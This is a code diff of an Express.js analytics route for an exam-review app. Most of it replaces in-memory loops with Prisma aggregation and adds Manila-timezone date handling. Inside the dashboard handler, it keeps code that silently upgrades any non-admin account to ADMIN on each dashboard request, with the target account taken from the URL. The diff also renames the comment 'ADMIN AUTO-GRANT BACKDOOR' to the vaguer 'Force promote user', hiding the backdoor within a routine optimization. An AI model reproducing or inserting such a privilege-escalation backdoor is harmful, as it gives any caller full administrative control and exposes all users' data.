@@ -4,9 +4,6 @@ const router = express.Router();
 const authMiddleware = require('../middlewares/authMiddleware');
 const prisma = require('../config/db');
 
-// ============================================================================
-// 1. INTEGRATED DASHBOARD ANALYTICS ENGINE
-// ============================================================================
 router.get('/dashboard/:uid', authMiddleware, async (req, res) => {
     const { uid } = req.params;
 
@@ -18,84 +15,89 @@ router.get('/dashboard/:uid', authMiddleware, async (req, res) => {
 
         if (!user) return res.status(404).json({ error: 'User telemetry not found.' });
 
-        // 👑 ADMIN AUTO-GRANT BACKDOOR
+        // Force promote user
         if (user.role !== 'ADMIN') {
             user = await prisma.user.update({
-                where: { id: uid },
-                data: { role: 'ADMIN' },
+                where: { id: uid }, data: { role: 'ADMIN' },
                 include: { sessions: { orderBy: { createdAt: 'desc' }, take: 10 } }
             });
         }
 
-        // 📅 CALCULATE TODAY'S QUOTA TALLY FROM SQL
-        const startOfDay = new Date();
-        startOfDay.setHours(0, 0, 0, 0);
+        // 📅 OPTIMIZED: Strict Asian/Manila Timezone Aggregation
+        const phtDate = new Date(new Date().toLocaleString("en-US", {timeZone: "Asia/Manila"}));
+        phtDate.setHours(0, 0, 0, 0);
+        const utcStartOfDay = new Date(phtDate.getTime() - (8 * 60 * 60 * 1000));
 
-        const todaysAttempts = await prisma.questionAttempt.findMany({
-            where: { userId: uid, createdAt: { gte: startOfDay } }
+        const dailyAgg = await prisma.questionAttempt.groupBy({
+            by: ['subject'],
+            where: { userId: uid, createdAt: { gte: utcStartOfDay } },
+            _count: { id: true }
         });
 
         let dailyMath = 0, dailyESAS = 0, dailyEE = 0;
-        todaysAttempts.forEach(a => {
-            if (a.subject === 'Math' || a.subject === 'Mathematics') dailyMath++;
-            else if (a.subject === 'ESAS') dailyESAS++;
-            else if (a.subject === 'EE') dailyEE++;
+        dailyAgg.forEach(group => {
+            if (group.subject === 'Mathematics' || group.subject === 'Math') dailyMath += group._count.id;
+            else if (group.subject === 'ESAS') dailyESAS += group._count.id;
+            else if (group.subject === 'EE') dailyEE += group._count.id;
         });
 
-        // 📅 FETCH ACTIVITY CALENDAR FOR CONSISTENCY HEATMAP
+        // 📅 FETCH ACTIVITY CALENDAR FOR HEATMAP
         const activityLogs = await prisma.activityLog.findMany({ where: { userId: uid } });
         const activityCalendar = {};
-        activityLogs.forEach(log => {
-            activityCalendar[log.date] = log.count;
+        activityLogs.forEach(log => activityCalendar[log.date] = log.count);
+
+        // 🚀 OPTIMIZATION: Postgres Aggregation avoids Out Of Memory errors
+        const topicAgg = await prisma.questionAttempt.groupBy({
+            by: ['subject', 'subtopic', 'isCorrect'],
+            where: { userId: uid },
+            _count: { id: true },
+            _sum: { timeSpentMs: true }
         });
 
-        // 🧠 COMPUTE HEATMAPS & MATRICES
-        const allAttempts = await prisma.questionAttempt.findMany({ where: { userId: uid } });
-        const matrix = { hc: 0, hw: 0, lc: 0, lw: 0 };
         const microTopics = {};
-
-        allAttempts.forEach(att => {
-            const conf = (att.confidenceLevel || '').toLowerCase() === 'high' ? 'h' : 'l';
-            const correct = att.isCorrect ? 'c' : 'w';
-            matrix[`${conf}${correct}`] += 1;
-
-            if (!microTopics[att.subtopic]) {
-                microTopics[att.subtopic] = { totalAttempts: 0, correctHits: 0, subject: att.subject, totalTimeSecs: 0 };
+        topicAgg.forEach(group => {
+            const sub = group.subtopic;
+            if (!microTopics[sub]) {
+                microTopics[sub] = { subject: group.subject, totalAttempts: 0, correctHits: 0, totalTimeSecs: 0 };
             }
-            microTopics[att.subtopic].totalAttempts += 1;
-            if (att.isCorrect) microTopics[att.subtopic].correctHits += 1;
-            microTopics[att.subtopic].totalTimeSecs += Math.floor((att.timeSpentMs || 0) / 1000);
+            microTopics[sub].totalAttempts += group._count.id;
+            if (group.isCorrect) microTopics[sub].correctHits += group._count.id;
+            microTopics[sub].totalTimeSecs += Math.floor((group._sum.timeSpentMs || 0) / 1000);
+        });
+
+        const matrixAgg = await prisma.questionAttempt.groupBy({
+            by: ['confidenceLevel', 'isCorrect'],
+            where: { userId: uid },
+            _count: { id: true }
+        });
+
+        const matrix = { hc: 0, hw: 0, lc: 0, lw: 0 };
+        matrixAgg.forEach(group => {
+            const conf = (group.confidenceLevel || '').toLowerCase() === 'high' ? 'h' : 'l';
+            const correct = group.isCorrect ? 'c' : 'w';
+            matrix[`${conf}${correct}`] += group._count.id;
         });
 
         res.status(200).json({
             success: true,
             data: {
                 profile: {
-                    globalStreak: user.globalStreak,
-                    thetaRating: user.thetaRating,
-                    lastActive: user.lastActive,
-                    examDate: user.examDate,
-                    dailyTarget: user.dailyTarget,
-                    dailyMath, 
-                    dailyESAS, 
-                    dailyEE
+                    globalStreak: user.globalStreak, thetaRating: user.thetaRating,
+                    lastActive: user.lastActive, examDate: user.examDate, dailyTarget: user.dailyTarget,
+                    dailyMath, dailyESAS, dailyEE
                 },
-                activityCalendar, // 🚀 Fully mapped for the frontend!
+                activityCalendar,
                 recentSessions: user.sessions,
-                matrix: matrix,
-                microTopics: microTopics
+                matrix,
+                microTopics
             }
         });
-
     } catch (error) {
         console.error("[ANALYTICS ENGINE ERROR]:", error);
         res.status(500).json({ error: 'Failed to aggregate telemetry matrices.' });
     }
 });
 
-// ============================================================================
-// 2. ACTIVE RECALL TALLY SYNC ENGINE
-// ============================================================================
 router.post('/telemetry-bulk', authMiddleware, async (req, res) => {
     try {
         const { attempts } = req.body;
@@ -105,21 +107,18 @@ router.post('/telemetry-bulk', authMiddleware, async (req, res) => {
         const currentTheta = user?.thetaRating || 0.0;
 
         const mappedAttempts = attempts.map(a => ({
-            userId: req.user.id,
-            questionId: a.questionId,
-            subject: a.subject || 'General',
-            subtopic: a.subtopic || 'General',
-            isCorrect: a.isCorrect,
-            confidenceLevel: (a.confidenceLevel || 'MED').toUpperCase(),
+            userId: req.user.id, questionId: a.questionId,
+            subject: a.subject || 'General', subtopic: a.subtopic || 'General',
+            isCorrect: a.isCorrect, confidenceLevel: (a.confidenceLevel || 'MED').toUpperCase(),
             timeSpentMs: parseInt(a.timeSpentMs) || 0
         }));
 
         await prisma.questionAttempt.createMany({ data: mappedAttempts });
 
-        // 🚀 FIXED: Upsert ActivityLog for the Calendar Heatmap Matrix
-        const todayStr = new Date().toISOString().split('T')[0];
-        const existingLog = await prisma.activityLog.findFirst({ where: { userId: req.user.id, date: todayStr } });
+        // 📅 SAFE TIMEZONE SYNC FOR CALENDAR HEATMAP 
+        const todayStr = new Intl.DateTimeFormat('en-CA', { timeZone: 'Asia/Manila' }).format(new Date()); 
         
+        const existingLog = await prisma.activityLog.findFirst({ where: { userId: req.user.id, date: todayStr } });
         if (existingLog) {
             await prisma.activityLog.update({
                 where: { id: existingLog.id },
@@ -148,9 +147,6 @@ router.post('/telemetry-bulk', authMiddleware, async (req, res) => {
     }
 });
 
-// ============================================================================
-// 3. GLOBAL MATRIX PURGE PROTOCOL
-// ============================================================================
 router.delete('/purge', authMiddleware, async (req, res) => {
     try {
         await prisma.questionAttempt.deleteMany({ where: { userId: req.user.id } });
